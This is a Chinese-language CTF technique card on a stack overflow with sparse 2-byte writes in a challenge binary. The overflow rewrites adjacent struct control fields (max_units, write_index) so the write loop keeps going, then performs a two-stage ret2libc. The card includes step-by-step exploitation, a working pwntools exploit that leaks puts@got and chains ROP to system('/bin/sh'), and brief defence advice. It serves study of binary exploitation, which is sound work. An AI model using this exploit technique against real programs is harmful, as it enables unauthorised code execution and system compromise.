---
id: binary-pwn-stack-sparse-word-write-struct-field-rewrite-ret2libc
title: 2 字节稀疏写栈溢出：改写 max_units/write_index 维持循环并两阶段 ret2libc
type: scenario
domain: binary
path: binary/pwn/stack
technique: sparse-word-stack-overflow-struct-field-rewrite-ret2libc
aliases:
- 稀疏写栈溢出
- 2 字节写溢出
- max_units write_index 改写
- 两阶段 ret2libc
- keep_stack
- 结构体控制字段覆写
tags:
- pwn
- stack
- stack-overflow
- sparse-write
- struct-overflow
- ret2libc
- rop
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V91
  verified_at: '2026-11-05T19:56:49+08:00'
  notes: 已对照原文与2图核对：message_ctx_t{text[128],max_units,write_index}在栈 rbp-0xA0，read_sparse_message 按 stride*write_index++ 写 2 字节且只 break 于 >0x80，payload 改写 max_units/write_index 维持循环；两轮 pwn1(4字节步长回 main)+pwn2(2字节步长逐 2 字节写 ROP)、puts@got 泄露、二次 ret2libc 与 exp.py 截图一致。原文未标 libc 版本，卡内『2.27/2.31 类环境』为推测；exp 未在本机复跑。未设 affected_versions；frontmatter无sources/source_url。
---

## 一句话结论

当栈上结构体 `message_ctx_t { char text[128]; size_t max_units; size_t write_index; }` 的写循环按 `text[stride * write_index++] = 2 字节` 落笔时，输入长度会先把 `max_units` 覆盖成更大值、再把 `write_index` 改成目标偏移，循环就能继续越过 `text` 写进结构体控制字段和保存的 RBP/返回地址；用两轮输入（第一轮把返回地址改回 `main` 取得第二次机会，第二轮用 2 字节步长逐段写入 ROP 链）即可泄漏 `puts@got` 并 ret2libc 执行 `system("/bin/sh")`。

## 原理

- **结构体布局**：`message_ctx_t` 在栈上（原文位于 `rbp-0xA0`），`text[128]` 占 `0x00–0x7F`，`max_units` 在 `+0x80`，`write_index` 在 `+0x88`；再往上就是局部变量、保存的 RBP 和返回地址。写循环不做 `write_index` 的上界检查（只在自增后判断 `>0x80` 就 break），因此只要把 `max_units` 改大、把 `write_index` 指到目标偏移，就能继续写。
- **稀疏写的粒度**：循环每次 `read(0, &input_pair, 2)` 读 2 字节，然后写 `*(_WORD*)&ctx->text[stride * write_index++]`。`stride` 由全局 `g_sparse_stride_mode` 决定：等于 2 时用 4 字节步长，否则用 2 字节步长；`reset_write_index_and_xor_mode1`/`xor_mode3` 会在每次调用时翻转该全局值。2 字节步长可以逐 2 字节精确覆盖返回地址，4 字节步长更稀疏、覆盖不全，所以原文第一轮只用于把返回地址改回 `main`，第二轮才用 2 字节步长完成 ROP。
- **为什么能写穿结构体**：`max_units` 和 `write_index` 本身就在 `text` 之后，循环用它们自身作为控制变量。先用输入把 `max_units` 覆盖成一个足够大的值（例如 0x24/0x46 等，按轮次调整），再把 `write_index` 覆盖成 `0x23/0x29` 等目标索引，循环条件 `write_index < max_units` 仍成立，于是继续向 `text` 之后写；这相当于“用溢出去延长溢出”。
- **两阶段的原因**：第一轮可用长度/步长不足以同时完成 libc 泄漏和 ROP；先把返回地址改成 `main`（或等价入口）让程序重新进入菜单/输入流程，第二轮再构造完整链：`pop rdi; ret` + `puts@got` + `puts@plt` 泄漏 libc，然后 `ret` 对齐 + `pop rdi` + `/bin/sh` + `system`。
- **栈帧维护**：改写返回地址/保存的 RBP 会破坏原有调用路径，原文通过慢调试找到合适的跳转/汇编片段调整栈，而不是简单覆盖循环条件；实际利用时需要在结构体修改处下断点反复验证偏移，确保 `max_units`/`write_index` 在每一轮都被写成预期值。
- **边界**：若开启栈保护（canary），需要先泄漏/绕过 canary；结构体控制字段不在缓冲区之后、或循环有严格的 `write_index` 上界检查时该手法不成立；NX 开启时需 ROP/ret2libc，不能直接执行栈上 shellcode。

## 触发条件

- 目标为开启 NX 的 Linux x86-64 程序，栈上结构体包含“缓冲区 + 紧邻的长度/索引控制字段”，写循环按 `stride * write_index` 写入且缺少上界检查。
- 输入长度/全局模式可影响步长（2 或 4 字节），且能发送任意二进制字节（含 `\x00`）。
- 存在可用的 libc 泄漏点（如 `puts@got`）、`pop rdi; ret` 等 gadget，以及 `main` 等可二次进入的地址。
- 无栈 canary，或 canary 可被泄漏/绕过；程序未启用 Full RELRO 以外的阻碍（ret2libc 需要 GOT 可读，通常 Partial RELRO 即可）。

## 利用步骤

1. **逆结构体与循环**：确认 `text`、`max_units`、`write_index` 的相对偏移，`stride` 的来源与切换时机，循环终止条件；在调试器中观察 `rbp` 与返回地址相对 `text` 的偏移。
2. **第一轮（4 字节步长）**：按长度限制填满 `text`，在对应索引写入新的 `max_units`（足够大）和 `write_index`（指向返回地址前的偏移），再把返回地址的低字节改成 `main` 的地址；利用 4 字节步长的稀疏写只完成“回到 main”。
3. **第二轮（2 字节步长）**：重新进入后，先用 64 个 2 字节对填满 `text`，覆盖 `max_units` 为更大的值、`write_index` 为目标偏移，然后用 2 字节一组依次写入 ROP 链的每个 qword（小端低 2 字节在前）。
4. **泄漏 libc**：ROP 调用 `puts(puts@got)`，从输出读取 6 字节地址，减去 libc 中 `puts` 偏移得到基址。
5. **二次 ROP**：再次利用同一溢出，写入 `ret`（栈对齐）+ `pop rdi` + `binsh` + `system`，触发 shell。
6. **验证**：在结构体写入处/`ret` 处下断点，确认 `max_units`、`write_index`、保存 RBP、返回地址逐轮符合预期；若崩溃，检查步长与索引是否错位。

## PoC

原文完整 exp 的核心片段（libc 2.27/2.31 类环境，未在本机复跑）：

```python
from pwn import *
context.arch = 'amd64'
elf = ELF('./keep_stack', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './keep_stack'])

pop_rdi = 0x4011e1
ret     = 0x40101a
main    = 0x401787

def sd(data):
    io.send(data); sleep(0.02)

def pwn1(wait=True):
    if wait: io.recvuntil(b'length: \n')
    io.sendline(b'33')              # 第一轮长度，决定 max_units/步长
    io.recvuntil(b'What do you want to say? \n')
    for _ in range(32): sd(b'aa')   # 填 text
    sd(b'\x2b\x00'); sd(b'\x00\x00')  # 改写 max_units / 索引相关字段
    sd(b'\x23\x00'); sd(b'\x00\x00')
    for _ in range(5): sd(b'\x00\x00')
    sd(b'\xcd\x16')                  # 返回地址低 2 字节 -> main 附近

def pwn2(chain, ret_addr, wait=True):
    if wait: io.recvuntil(b'length: \n')
    io.sendline(b'66')              # 第二轮长度，切换为 2 字节步长
    io.recvuntil(b'What do you want to say? \n')
    for _ in range(64): sd(b'aa')   # 填满 text[128]
    sd(p16(0x54 + (len(chain) + 1) * 4))  # 改 max_units
    sd(b'\x00\x00'); sd(b'\x00\x00'); sd(b'\x00\x00')
    sd(b'\x46\x00')                 # 改 write_index
    for _ in range(13): sd(b'\x00\x00')
    for x in chain + [ret_addr]:    # 逐 qword、每 2 字节写入
        x = p64(x)
        sd(x[0:2]); sd(x[2:4]); sd(x[4:6]); sd(x[6:8])

pwn1()
pwn2([pop_rdi, elf.got['puts'], elf.plt['puts']], main)
# 读 puts 泄漏 -> libc.address -> 第二次 pwn1/pwn2 写 system("/bin/sh")
```

说明：上面的具体索引/字节值依赖题目结构体偏移与步长切换，复现时需按二进制调整；核心是“覆盖 max_units/write_index 维持循环 + 2 字节一组写 ROP”。

## 变体与关联

- **步长变体**：4 字节步长先做一次跳转、2 字节步长做精细覆写；也可用 2 字节步长从第一轮直接完成全部 ROP（若长度/索引允许）。
- **返回目标变体**：返回 `main`、返回菜单函数、返回 `_start`、栈迁移到 BSS（见 [[binary-pwn-stack-pivot-leave-ret-bss]]）；多阶段 ret2libc/ret2dlresolve。
- **防护变体**：有 canary 时先泄漏 canary 或利用 `__stack_chk_fail`；Full RELRO 时改打 `__free_hook`/FSOP；PIE 需先泄漏代码基址。
- **关联**：[[ret2libc]]、[[binary-pwn-stack-ret2text-win-plus-one-align]]、[[binary-pwn-stack-cjson-unicode-byte-injection-partial-overwrite]]、[[binary-pwn-stack-strcmp-nullbyte-local-ptr-backfill-ret2text]]。
- **边界**：结构体控制字段不在缓冲区后、循环严格检查 `write_index`、输入不能含 `\x00`、canary/ASLR/PIE 未泄漏时失效。

## 检测与防御

- **代码侧**：写循环必须同时检查 `write_index` 与缓冲区容量，不能只依赖 `max_units`；把长度/索引等控制字段与可写缓冲区隔离（放到独立结构/只读副本）；对用户输入做长度与边界校验。
- **编译加固**：开启栈保护（`-fstack-protector-strong`）、FORTIFY_SOURCE、PIE、Full RELRO、NX；使用安全语言/安全字符串函数。
- **检测**：栈上返回地址被改写、ROP 链特征（`pop rdi; ret` 等 gadget 连续出现）、函数返回前 `max_units/write_index` 异常增大、`puts` 输出后立即再次读入并溢出；CTF 外可结合栈 canary 崩溃日志与 EDR 调用栈。
- **响应**：崩溃转储中检查栈回溯与 gadget 地址；对可疑二进制做边界检查审计。
